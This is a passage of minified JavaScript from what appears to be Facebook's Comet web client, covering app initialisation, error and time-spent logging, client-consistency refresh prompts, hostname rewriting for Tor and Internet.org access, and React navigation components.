      var h;
      function a(a, b, e, f, g, i, j, k) {
        if (!(h || (h = c("ExecutionEnvironment"))).canUseDOM) return;
        var l = a.buildRootComponent,
          m = a.clientQPLEvent,
          n = a.initClient,
          o = a.initialLoadTraceConfig,
          p = c("uuidv4")(),
          q = c("getInstanceIdentifierFromRoute")(f);
        d("CometNavigationTracing").traceInitialLoad(
          p,
          e,
          f.tracePolicy,
          q,
          function (c) {
            var h;
            d("CometPlatformBaseClientRootRenderer").initClientRender({
              buildRootComponent: function () {
                return l(
                  {
                    initialBackgroundRoute: k,
                    initialBackgroundTimeSpentMetadata: j,
                    initialRootRoute: f,
                    initialTimeSpentMetadata: i,
                  },
                  p
                );
              },
              config: a,
              expectedPreloaders: g,
              initClient: function () {
                return n({
                  client_id: e,
                  initialRoute: f,
                  rootElementID: b,
                  timeSpentMetadata: i,
                  traceAPI: c,
                });
              },
              rootElementID: b,
              ssrEnabled: (h = a.ssrEnabled) != null ? h : !0,
              traceAPI: c,
            });
          },
          m,
          o
        );
      }
      g.initRoute = a;
    },
    98
  );
  __d(
    "CometRootConfigBuilder",
    ["err"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = (function () {
        function a() {}
        var b = a.prototype;
        b.buildRootConfig = function () {
          throw c("err")("unimplemented, this is a base class");
        };
        return a;
      })();
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPlatformRootClient",
    [
      "CometPlatformRouterRootClientRenderer",
      "CometRootConfigBuilder",
      "FBLogger",
      "InteractionTracingMetrics",
      "setTimeout",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b) {}
      var h, i;
      function b(a, b, e, f, g, i, k) {
        k === void 0 && (k = null);
        if (h != null) {
          c("FBLogger")("comet_platform_root_client", "multiple_init").mustfix(
            "Multiple calls to CometPlatformRootClient.init are not supported."
          );
          return;
        }
        h = a instanceof c("CometRootConfigBuilder") ? a.buildRootConfig() : a;
        d("CometPlatformRouterRootClientRenderer").initRoute(
          h,
          b,
          e,
          f,
          g,
          i,
          (a = k) == null ? void 0 : a.timeSpentMetaData,
          (b = k) == null ? void 0 : b.backgroundRoute
        );
        c("setTimeout")(function () {
          j();
        });
      }
      function e(a) {
        if (i != null) {
          c("FBLogger")(
            "comet_platform_root_client",
            "multiple_init_deferred"
          ).mustfix(
            "Multiple calls to CometPlatformRootClient.setInitDeferredPayload are not supported."
          );
          return;
        }
        i = a;
        k("setInitDeferredPayload");
        j();
      }
      function j() {
        if (i == null || h == null) return;
        var a = h;
        a = a.DeferredRoot;
        var b = i;
        a.onReady(function (a) {
          k("initDeferred_execute"), a.initDeferred(b);
        });
      }
      function k(a) {
        try {
          c("InteractionTracingMetrics")
            .currentInteractionLogger()
            .forEach(function (b) {
              c("InteractionTracingMetrics").addMarkerPoint(
                b.traceId,
                a,
                "AppTiming"
              );
            });
        } catch (b) {
          c("FBLogger")("comet_platform_root_client", "apptiming_log_failure")
            .catching(b)
            .mustfix("Failed to add marker point %s", a);
        }
      }
      g.initDeferred = a;
      g.init = b;
      g.setInitDeferredPayload = e;
    },
    98
  );
  __d(
    "getEntityIDFromRoute",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        a =
          (a == null ? void 0 : (a = a.rootView) == null ? void 0 : a.props) ||
          {};
        if (a.userID) return a.userID;
        if (a.pageID) return a.pageID;
        if (a.groupID) return a.groupID;
        return a.eventID ? a.eventID : null;
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "extractTimeSpentFromCometRoute",
    ["getCometEntityKey", "getEntityIDFromRoute"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        var b, d;
        b =
          (b = (b = c("getCometEntityKey")(a)) == null ? void 0 : b.entity_id) !=
          null
            ? b
            : c("getEntityIDFromRoute")(a);
        d =
          (d = c("getCometEntityKey")(a)) == null
            ? void 0
            : d.parent_container_id;
        return {
          entityID: b,
          parentContainerId: d,
          timeSpentConfig: a.timeSpentConfig,
          tracePolicy: a.tracePolicy,
          url: a.url,
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometClientConsistency",
    [
      "fbt",
      "ix",
      "BaseToasterStateManager",
      "ClientConsistency",
      "ClientConsistencyEventEmitter",
      "CometErrorOverlay",
      "CometExceptionDialog.react",
      "CometTimeSpentNavigation",
      "OutsideExceptionKeyCommandListener.react",
      "TetraIcon.react",
      "cometPushToast",
      "fbicon",
      "gkx",
      "react",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k = j || (j = d("react"));
      a = j;
      var l = a.useEffect,
        m = a.useRef,
        n = c("requireDeferred")("ClientConsistencyFalcoEvent").__setRef(
          "CometClientConsistency"
        ),
        o = c("BaseToasterStateManager").getInstance(),
        p = !1,
        q = null,
        r = null,
        s = function (a) {
          n.onReady(function (b) {
            b.log(function () {
              var b;
              return babelHelpers["extends"](
                {
                  revs: Array.from(
                    c("ClientConsistency").getAdditionalRevisions()
                  ).map(function (a) {
                    return a.toString();
                  }),
                  trace_policy:
                    (b = c("CometTimeSpentNavigation").getPathInfo()) == null
                      ? void 0
                      : b.name,
                },
                a
              );
            });
          });
        },
        t = function (a) {
          return (a != null ? Date.now() - a : -1).toString();
        },
        u = function () {
          l(function () {
            (r = Date.now()), s({ action: 2, event: "impression" });
          }, []);
          return k.jsx(c("TetraIcon.react"), {
            color: "warning",
            icon: d("fbicon")._(i("502062"), 20),
          });
        },
        v = function () {
          var a = m(null);
          l(function () {
            (a.current = Date.now()), s({ action: 3, event: "impression" });
          }, []);
          return k.jsx(c("OutsideExceptionKeyCommandListener.react"), {
            children: k.jsx(c("CometExceptionDialog.react"), {
              closeButtonText: h._("__JHASH__ITdZE8FVnv1__JHASH__"),
              errorDescription: h._("__JHASH__JZ_cnbet5Qa__JHASH__"),
              errorSummary: h._("__JHASH__Obip5oOzxbP__JHASH__"),
              onClose: function () {
                s({ action: 3, duration: t(a.current), event: "click" }),
                  (p = !1),
                  (a.current = null),
                  window.location.reload(!0);
              },
              withCloseButton: !1,
            }),
          });
        },
        w = function () {
          if (p) return;
          if (q != null) return;
          q = d("cometPushToast").cometPushToast(
            {
              action: {
                label: h._("__JHASH__ITdZE8FVnv1__JHASH__"),
                onPress: function () {
                  s({ action: 2, duration: t(r), event: "click" }),
                    (q = null),
                    (r = null),
                    window.location.reload(!0);
                },
              },
              icon: k.jsx(u, {}),
              message: h._("__JHASH__UmQdCpWvrAZ__JHASH__"),
              supressCloseButton: !0,
            },
            Infinity
          );
          o.stopTimer(q);
        },
        x = function () {
          if (p) return;
          q && o["delete"](q);
          p = !0;
          d("CometErrorOverlay").injectComponent(function (a) {
            return k.jsx(v, {});
          });
        },
        y = !1;
      b = {
        init: function () {
          if (y) return;
          if (!c("gkx")("1661552")) return;
          c("ClientConsistency").init();
          c("ClientConsistencyEventEmitter").addListener("softRefresh", w);
          c("ClientConsistencyEventEmitter").addListener("hardRefresh", x);
          y = !0;
        },
        logRefreshOnNav: function () {
          s({ action: 1, event: "impression" });
        },
      };
      e = b;
      g["default"] = e;
    },
    98
  );
  __d(
    "CometErrorLogging",
    [
      "ClientConsistency",
      "Env",
      "ErrorGuard",
      "ErrorSetup",
      "ErrorTransport",
      "JSErrorLoggingConfig",
      "SiteData",
      "WebSession",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h, i;
      function a(a) {
        (h || (h = c("ErrorGuard"))).skipGuardGlobal(
          (i || (i = c("Env"))).nocatch
        );
        b = a;
        if (c("JSErrorLoggingConfig").sampleWeight != null) {
          c("ErrorSetup").setup(
            {
              additional_client_revisions:
                c("ClientConsistency").getAdditionalRevisions(),
              appId: (a = c("JSErrorLoggingConfig")).appId,
              cavalry_lid: b,
              client_revision: c("SiteData").client_revision,
              extra: a.extra,
              loggingFramework: "comet",
              projectBlocklist: a.projectBlocklist,
              push_phase: c("SiteData").push_phase,
              report_source: a.report_source,
              report_source_ref: a.report_source_ref,
              sample_weight:
                (a = c("JSErrorLoggingConfig").sampleWeight) != null ? a : 0,
              script_path: "/comet",
              server_revision: c("SiteData").server_revision,
              spin: c("SiteData").spin,
              web_session_id: d("WebSession").getId(),
            },
            d("ErrorTransport").log
          );
        }
      }
      c("ErrorSetup").preSetup();
      g.init = a;
    },
    98
  );
  __d(
    "CometErrorSystem",
    ["CometErrorLogging", "QuickMarkersComet", "cr:1267207", "cr:4345"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        d("CometErrorLogging").init(a),
          b("cr:4345") && b("cr:4345").init(),
          b("cr:1267207") && b("cr:1267207")(),
          d("QuickMarkersComet").init();
      }
      g.init = a;
    },
    98
  );
  __d(
    "CometPixelRatioDetector",
    ["requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("CometPixelRatioUpdater").__setRef(
        "CometPixelRatioDetector"
      );
      function a() {
        h.onReady(function (a) {
          return a.startDetecting();
        });
      }
      g.initDetecting = a;
    },
    98
  );
  __d(
    "WebTimeSpentNavigationFalcoEvent",
    ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("getFalcoLogPolicy_DO_NOT_USE")("1829321");
      b = d("FalcoLoggerInternal").create("web_time_spent_navigation", a);
      e = b;
      g["default"] = e;
    },
    98
  );
  __d(
    "CometTimeSpentNavigationLogger",
    [
      "Banzai",
      "CometTimeSpentNavigation",
      "ConstUriUtils",
      "Env",
      "WebSession",
      "WebTimeSpentNavigationFalcoEvent",
      "isInIframe",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = !1;
      function j(a) {
        c("WebTimeSpentNavigationFalcoEvent").logImmediately(function () {
          return {
            cause: a.cause,
            custom_data_json: JSON.stringify(a.extra_data),
            dest_path: a.dest_path,
            sid_raw: a.sid_raw,
            source_path: a.source_path,
          };
        });
      }
      function k(a, b, e) {
        d("WebSession").extend();
        if (!i || c("isInIframe")()) return;
        var f = { cause: e, extra_data: {}, sid_raw: d("WebSession").getId() };
        a &&
          ((f.source_path = a.name),
          Object.entries(a.extraData).forEach(function (a) {
            var b = a[0];
            a = a[1];
            return (f.extra_data["source_" + b] = a);
          }));
        b &&
          ((f.dest_path = b.name),
          Object.entries(b.extraData).forEach(function (a) {
            var b = a[0];
            a = a[1];
            return (f.extra_data["dest_" + b] = a);
          }));
        (h || (h = c("Env"))).isCometOnMobile === !0 &&
          (f.extra_data.comet_on_mobile = "1");
        j(f);
      }
      function l() {
        var a = c("CometTimeSpentNavigation").getPathInfo();
        if (!a) return;
        a = babelHelpers["extends"]({}, a, {
          extraData: babelHelpers["extends"]({}, a.extraData, {
            referrer: document.referrer,
            subdomain:
              (a = d("ConstUriUtils").getUri(document.location.href)) == null
                ? void 0
                : a.subdomain,
          }),
        });
        k(c("CometTimeSpentNavigation").getSourcePathInfo(), a, "load");
      }
      function m() {
        k(c("CometTimeSpentNavigation").getPathInfo(), null, "unload"), (i = !1);
      }
      function n(a, b) {
        k(a, b, "transition");
      }
      function o(a) {
        var b = a.sourcePathInfo;
        a = a.destPathInfo;
        if (!i || !b || !a) return;
        n(b, a);
      }
      function a(a, b, d) {
        b === void 0 && (b = null),
          (i = !0),
          c("CometTimeSpentNavigation").changePath(a, d, b),
          l(),
          c("CometTimeSpentNavigation").listenToPathChange(o),
          c("Banzai").subscribe(c("Banzai").SHUTDOWN, m);
      }
      g.init = a;
    },
    98
  );
  __d(
    "HostnameRewriter",
    ["ConstUriUtils", "Env", "URI", "isFacebookURI", "lowerFacebookDomain"],
    function (a, b, c, d, e, f, g) {
      var h,
        i,
        j = function (a) {
          return String(a).replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1");
        },
        k = null,
        l = null,
        m = new RegExp("facebook\\.com$"),
        n = new RegExp("^www\\.(|.*\\.)facebook\\.com$"),
        o = null,
        p = "facebook.com",
        q = null,
        r = new RegExp("fbcdn\\.net$"),
        s = new RegExp("^www\\."),
        t = new RegExp("(^|\\.)(facebook\\.com|workplace\\.com)$", "i");
      function u() {
        k = null;
        var a = "(^|\\.)";
        o = a + j(p) + "$";
        l = null;
      }
      function v() {
        if (o == null) return null;
        if (k) return k;
        k = new RegExp(o, "i");
        return k;
      }
      function w() {
        if (l) return l;
        l = new RegExp("(^|\\.)(" + j(p) + "|facebook\\.com)$", "i");
        return l;
      }
      function x(a) {
        if (w().test(a) && p != null) return a.replace(m, p);
        else if (q != null && a !== null) return a.replace(r, q);
        return a;
      }
      function y(a) {
        return n.test(a) ? a.replace(s, "web.") : a;
      }
      function z(a) {
        return function (b) {
          b = new (h || (h = c("URI")))(b);
          b.setDomain(a(b.getDomain()));
          return b;
        };
      }
      function A(a, b) {
        (p = a),
          (q = b),
          u(),
          c("isFacebookURI").setRegex(v()),
          (h || (h = c("URI"))).registerFilter(z(x)),
          d("ConstUriUtils").registerDomainFilter(x),
          c("lowerFacebookDomain").setDomain(p);
      }
      function a(a, b) {
        (p = a), (h || (h = c("URI"))).registerFilter(z(y));
      }
      function b() {
        var a = (i || (i = c("Env"))).hostnameRewriterConfig;
        if (a == null) return;
        switch (a.site) {
          case "onion":
            A(a.inboundName, a.cdnDomainName);
            break;
        }
      }
      function e() {
        c("isFacebookURI").setRegex(t);
      }
      g.registerFacebookOverTorFilters = A;
      g.registerInternetDotOrgFilters = a;
      g.maybeRegisterFilters = b;
      g.treatWorkplaceAsFacebookURI = e;
    },
    98
  );
  __d(
    "initCometPlatformWebPage",
    [
      "CometClientConsistency",
      "CometErrorSystem",
      "CometPixelRatioDetector",
      "CometTimeSpentBitArrayLogger",
      "CometTimeSpentNavigationLogger",
      "CometVisitationManager",
      "FBLogger",
      "HostnameRewriter",
      "WebPerformanceDeviceInfo",
      "cr:11192",
      "cr:1132918",
      "cr:2363",
      "cr:2654",
      "cr:4001",
      "cr:866",
      "justknobx",
      "requireDeferred",
      "requireDeferredForDisplay",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("CometBrowserDimensionsLogger").__setRef(
          "initCometPlatformWebPage"
        ),
        i = c("requireDeferred")("CometChromeDome").__setRef(
          "initCometPlatformWebPage"
        ),
        j = c("requireDeferredForDisplay")("maybeRemoveElement").__setRef(
          "initCometPlatformWebPage"
        );
      function a(a, e, f) {
        var g = e.disableTimeSpentLogging,
          k = e.productAttribution,
          l = e.timeSpentMetadata;
        e = e.timeSpentRoute;
        d("CometErrorSystem").init(a);
        if (!((a = f == null ? void 0 : f.disableDevTools) != null ? a : !1)) {
          b("cr:2654") &&
            b("cr:2654").init({
              connectFromIFrame:
                (a = f == null ? void 0 : f.connectFromIFrame) != null ? a : !1,
            });
        }
        b("cr:4001") && b("cr:4001")();
        i.onReady(function (a) {
          return a.init();
        });
        d("WebPerformanceDeviceInfo").initWebDevicePerfLoggingPassive();
        h.onReady(function (a) {
          return a.init();
        });
        c("CometClientConsistency").init();
        d("CometPixelRatioDetector").initDetecting();
        g !== !0 &&
          (d("CometVisitationManager").init(e.tracePolicy),
          d("CometTimeSpentNavigationLogger").init(e, l, k),
          d("CometTimeSpentBitArrayLogger").init(e.tracePolicy));
        b("cr:866") && b("cr:866")();
        b("cr:1132918") && b("cr:1132918").handleServerErrors();
        b("cr:2363").onReady(function (a) {
          return a.attach();
        });
        b("cr:11192") && b("cr:11192").init();
        d("HostnameRewriter").maybeRegisterFilters();
        j.onReady(function (a) {
          a.maybeRemoveElementInit();
        });
        c("justknobx")._("1849") &&
          window.addEventListener("DOMContentLoaded", function () {
            document.getElementById("has-finished-comet-page") == null &&
              c("FBLogger")("comet_infra").warn(
                "Comet page did not finish loading correctly."
              );
          });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRootInitClient",
    [
      "CometProductAttribution",
      "ErrorGuard",
      "cr:1070",
      "extractTimeSpentFromCometRoute",
      "initCometPlatformWebPage",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = c("requireDeferred")("CometGHLTestUBT").__setRef(
          "CometRootInitClient"
        ),
        j = c("requireDeferred")("addCometProfileSwitchAnnotation").__setRef(
          "CometRootInitClient"
        );
      function k(a) {
        var e = a.client_id,
          f = a.initialRoute,
          g = a.timeSpentMetadata,
          h = a.traceAPI;
        c("initCometPlatformWebPage")(e, {
          disableTimeSpentLogging: !1,
          productAttribution: d(
            "CometProductAttribution"
          ).getProductAttributionFromRoute(f, "via_cold_start"),
          timeSpentMetadata: g,
          timeSpentRoute: c("extractTimeSpentFromCometRoute")(f),
        });
        b("cr:1070") == null ? void 0 : b("cr:1070")();
        i.onReady(function (a) {
          return a(h);
        });
        j.onReady(function (a) {
          return a(h);
        });
      }
      function l(a, b) {
        a.forEach(function (a) {
          (h || (h = c("ErrorGuard"))).applyWithGuard(a, null, [b]);
        });
      }
      function a(a) {
        return function (b) {
          (a == null ? void 0 : a.preInit) &&
            l(a == null ? void 0 : a.preInit, b),
            k(b),
            (a == null ? void 0 : a.postInit) &&
              l(a == null ? void 0 : a.postInit, b);
        };
      }
      e = a();
      g.makeInitClient = a;
      g.initClient = e;
    },
    98
  );
  __d(
    "HelpCenterCookiesConsentedProvider",
    ["CookieConsent", "react", "useFacebookCookieConsentHandler"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useContext,
        l = b.useMemo,
        m = j.createContext({
          consented: (h || (h = c("CookieConsent"))).hasConsent(1),
          onConsented: function () {},
        });
      e = function () {
        var a = k(m),
          b = a.consented;
        a = a.onConsented;
        return { consented: b, onConsented: a };
      };
      function a(a) {
        a = a.children;
        var b = c("useFacebookCookieConsentHandler")(),
          d = b[0],
          e = b[1];
        b = l(
          function () {
            return { consented: d, onConsented: e };
          },
          [d, e]
        );
        return j.jsx(m.Provider, { value: b, children: a });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g.useHelpCenterCookiesConsentedContext = e;
      g.HelpCenterCookiesConsentedContextProvider = a;
    },
    98
  );
  __d(
    "buildCometRootComponent",
    [
      "Actor",
      "CometBackupPlaceholder.react",
      "CometDOMOnlyBoundary.react",
      "CometErrorBoundary.react",
      "CometHeroInteractionWithDiv.react",
      "CometInteractionTracingQPLConfigContext",
      "CometPlatformAppWrapper.react",
      "CurrentUser",
      "ExecutionEnvironment",
      "HelpCenterCookiesConsentedProvider",
      "RelayEnvironmentFactoryProvider",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react");
      function a(a, b, e) {
        var f = e.TopLevelWrapper,
          g = f === void 0 ? j.Fragment : f;
        f = e.CometRouterStateProvider;
        var i = e.OtherRootComponents,
          k = i.CookieConsentDialog,
          l = i.DebugOwlDisplay,
          m = i.KeyCommandNub,
          n = i.ProductAttributionDebugger,
          o = i.Redblock,
          p = i.UncaughtErrorFallback;
        i = e.UIStateProviders;
        e = b.initialActorID;
        var q = e === void 0 ? c("CurrentUser").getID() : e,
          r = b.initialLoadTraceId,
          s = b.relayEnvironmentFactory;
        e = b.interactionQPLEvents;
        var t =
            e === void 0
              ? d("CometInteractionTracingQPLConfigContext")
                  .defaultInteractionQPLEvents
              : e,
          u = b.disableTimeSpentLogging;
        b = (e = i) != null ? e : {};
        i = b.DarkModeStateProvider;
        e = b.DensityModeStateProvider;
        var v = b.KeyboardSettingsStateProvider,
          w = (b = e) != null ? b : j.Fragment,
          x = (e = i) != null ? e : j.Fragment,
          y = (b = f) != null ? b : j.Fragment;
        return function () {
          return j.jsx(g, {
            children: j.jsx(
              d("CometInteractionTracingQPLConfigContext")
                .CometInteractionTracingQPLConfigContextProvider,
              {
                dialogTraceQPLEvent: t.dialogTraceQPLEvent,
                popoverTraceQPLEvent: t.popoverTraceQPLEvent,
                children: j.jsx(c("CometPlatformAppWrapper.react"), {
                  KeyboardSettingsStateProvider: v,
                  UncaughtErrorFallback: p,
                  disableTimeSpentLogging: u,
                  children: j.jsx(
                    d("RelayEnvironmentFactoryProvider")
                      .RelayEnvironmentFactoryProvider,
                    {
                      factory: s,
                      children: j.jsx(y, {
                        children: j.jsx(x, {
                          children: j.jsxs(w, {
                            children: [
                              j.jsx(c("CometBackupPlaceholder.react"), {
                                fallback: null,
                                children: j.jsxs(d("Actor").ActorProvider, {
                                  initialActorID: q,
                                  readonly: !0,
                                  children: [
                                    j.jsxs(
                                      c("CometHeroInteractionWithDiv.react"),
                                      {
                                        interactionDesc: "initial load",
                                        interactionUUID: r,
                                        children: [
                                          a,
                                          k
                                            ? j.jsx(
                                                c("CometErrorBoundary.react"),
                                                {
                                                  children: j.jsx(
                                                    d(
                                                      "HelpCenterCookiesConsentedProvider"
                                                    )
                                                      .HelpCenterCookiesConsentedContextProvider,
                                                    { children: j.jsx(k, {}) }
                                                  ),
                                                }
                                              )
                                            : null,
                                        ],
                                      }
                                    ),
                                    m
                                      ? j.jsx(c("CometErrorBoundary.react"), {
                                          children: j.jsx(m, {}),
                                        })
                                      : null,
                                  ],
                                }),
                              }),
                              j.jsxs(c("CometDOMOnlyBoundary.react"), {
                                children: [
                                  o &&
                                  (h || (h = c("ExecutionEnvironment"))).canUseDOM
                                    ? j.jsx(c("CometErrorBoundary.react"), {
                                        children: j.jsx(o, {}),
                                      })
                                    : null,
                                  l
                                    ? j.jsx(c("CometErrorBoundary.react"), {
                                        children: j.jsx(l, {}),
                                      })
                                    : null,
                                  n
                                    ? j.jsx(c("CometErrorBoundary.react"), {
                                        children: j.jsx(n, {}),
                                      })
                                    : null,
                                ],
                              }),
                            ],
                          }),
                        }),
                      }),
                    }
                  ),
                }),
              }
            ),
          });
        };
      }
      g.buildCometRootComponent = a;
    },
    98
  );
  __d(
    "CometAppNavigationEndSection.react",
    ["fbt", "CometTooltipGroup.react", "react"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || d("react");
      function a(a) {
        a = a.children;
        return j.jsx(c("CometTooltipGroup.react"), {
          children: j.jsx("div", {
            "aria-label": h._("__JHASH__bGEsEiRYp-X__JHASH__"),
            className: "x6s0dn4 x78zum5 x15zctf7 x1s65kcs x1n2onr6 x1ja2u2z",
            role: "navigation",
            children: a,
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppNavigationEndSectionItem.react",
    ["react", "stylex"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react"),
        k = {
          displayNone: { display: "x1s85apg", $$css: !0 },
          layoutEndButton: {
            alignItems: "x6s0dn4",
            display: "x78zum5",
            height: "x5yr21d",
            justifyContent: "xl56j7k",
            marginEnd: "x1emribx",
            marginLeft: null,
            marginRight: null,
            $$css: !0,
          },
          widePivotLink: {
            "@media (max-width: 1260px)_display": "xfff67h",
            "@media (max-width: 1379px)_maxWidth": "xu1161g",
            "@media (min-width: 1380px) and (max-height: 789px)_maxWidth":
              "x12ca73t",
            "@media (min-width: 1380px) and (min-height: 790px)_maxWidth":
              "x5vlmd",
            $$css: !0,
          },
        };
      function a(a) {
        var b = a.children,
          d = a.displayNone;
        d = d === void 0 ? !1 : d;
        var e = a.noWrapper;
        e = e === void 0 ? !1 : e;
        a = a.widePivotLink;
        a = a === void 0 ? !1 : a;
        return e
          ? b
          : j.jsx("div", {
              className: (h || (h = c("stylex")))([
                k.layoutEndButton,
                a && k.widePivotLink,
                d && k.displayNone,
              ]),
              children: b,
            });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppNavigationLayout.react",
    [
      "CometAppNavigationTabBarContainer.react",
      "CometContextualLayerAnchorRoot.react",
      "CometTooltipGroup.react",
      "FocusInertRegion.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b = a.children;
        a = a.inert;
        return i.jsx(c("FocusInertRegion.react"), {
          disabled: !a,
          children: i.jsx("div", {
            "aria-hidden": a,
            className: "xds687c xixxii4 x17qophe x13vifvy x1vjfegm",
            children: i.jsx(c("CometAppNavigationTabBarContainer.react"), {
              children: i.jsx(c("CometContextualLayerAnchorRoot.react"), {
                children: i.jsx(c("CometTooltipGroup.react"), { children: b }),
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometTopNav.react",
    ["fbt", "CometSection.react", "react"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || d("react");
      function a(a) {
        a = a.children;
        return j.jsx(c("CometSection.react"), {
          className: "x78zum5 x1s65kcs xl56j7k",
          name: h._("__JHASH__JQFwf9jC8Hy__JHASH__"),
          role: "navigation",
          testid: void 0,
          children: j.jsx("ul", {
            className:
              "xuk3077 x78zum5 x1iyjqo2 xl56j7k x1p8ty84 x1na7pl x88anuq",
            children: a,
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppNavigationTabBarContentWrapper.react",
    [
      "CometAppNavigationLayout.react",
      "CometErrorBoundary.react",
      "CometTopNav.react",
      "JSResource",
      "gkx",
      "lazyLoadComponent",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = c("lazyLoadComponent")(
          c("JSResource")(
            "CometAppNavigationFallbackTabBarContent.react"
          ).__setRef("CometAppNavigationTabBarContentWrapper.react")
        );
      function a(a) {
        var b = a.children;
        a = a.inert;
        return i.jsx(c("CometAppNavigationLayout.react"), {
          inert: a,
          children: i.jsx(c("CometTopNav.react"), {
            children: c("gkx")("2204")
              ? i.jsx(c("CometErrorBoundary.react"), {
                  fallback: function () {
                    return i.jsx(j, {});
                  },
                  children: b,
                })
              : b,
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometProductAttributionContextProvider.react",
    ["CometProductAttributionContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useContext,
        k = b.useMemo;
      function a(a) {
        var b = a.children,
          d = a.value,
          e = j(c("CometProductAttributionContext"));
        a = k(
          function () {
            return e != null && e.length > 0 ? [].concat(e, [d]) : [d];
          },
          [d, e]
        );
        return i.jsx(c("CometProductAttributionContext").Provider, {
          value: a,
          children: b,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometBaseAppNavigation.react",
    [
      "CometContextualLayerAnchorRoot.react",
      "CometProductAttributionContextProvider.react",
      "CometSection.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b = a.endSection,
          d = a.searchSection,
          e = a.startButtons;
        a = a.tabBar;
        return i.jsx(c("CometSection.react"), {
          role: "banner",
          children: i.jsxs(c("CometProductAttributionContextProvider.react"), {
            value: "topnav",
            children: [
              i.jsx("div", {
                className:
                  "x6s0dn4 x9f619 x78zum5 x1iyjqo2 x1s65kcs x1d52u69 xixxii4 x17qophe x13vifvy xzkaem6",
                children: i.jsx(c("CometContextualLayerAnchorRoot.react"), {
                  children: e,
                }),
              }),
              d,
              a,
              i.jsx("div", {
                className: "xds687c x1pi30zi x1e558r4 xixxii4 x13vifvy xzkaem6",
                children: i.jsx(c("CometContextualLayerAnchorRoot.react"), {
                  children: b,
                }),
              }),
            ],
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometProfilePlusAPPageInboxMessageButtonImpl.react",
    [
      "CometErrorBoundary.react",
      "CometIconMessengerFilled.react",
      "CometPlaceholder.react",
      "CometPressable.react",
      "SVGIcon",
      "TetraCircleButton.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b = a.deferredBadgeCount,
          e = a.label,
          f = a.linkProps,
          g = a.onPress;
        a = a.setBadgeCount;
        b = b;
        return i.jsxs(c("CometPressable.react"), {
          label: e,
          linkProps: f,
          onPress: g,
          style: { borderRadius: "50%" },
          children: [
            i.jsx(c("TetraCircleButton.react"), {
              icon: d("SVGIcon").legacySVGIcon(
                c("CometIconMessengerFilled.react")
              ),
              label: e,
              linkProps: f,
              onPress: g,
              size: 40,
            }),
            b != null &&
              i.jsx(c("CometErrorBoundary.react"), {
                children: i.jsx(c("CometPlaceholder.react"), {
                  fallback: i.jsx("span", {}),
                  children: i.jsx("span", {
                    className: "x10l6tqk x8zc4e7 xtu2xtp x1vjfegm",
                    children: i.jsx(b, { setBadgeCount: a }),
                  }),
                }),
              }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometProfilePlusAPPageInboxMessageButton.react",
    [
      "fbt",
      "CometProfilePlusAPPageInboxMessageButtonImpl.react",
      "CometRelay",
      "XPagesManagerInboxControllerRouteBuilder",
      "deferredLoadComponent",
      "gkx",
      "react",
      "recoverableViolation",
      "requireDeferredForDisplay",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useCallback,
        l = b.useRef,
        m = b.useState,
        n = c("deferredLoadComponent")(
          c("requireDeferredForDisplay")("MWChatBadgeCount.react").__setRef(
            "CometProfilePlusAPPageInboxMessageButton.react"
          )
        );
      function a(a) {
        a = a.mailboxID;
        a = c("XPagesManagerInboxControllerRouteBuilder").buildURL({
          page_token: a,
          referrer: "comet_profile_plus_ap_page_inbox_message_button",
        });
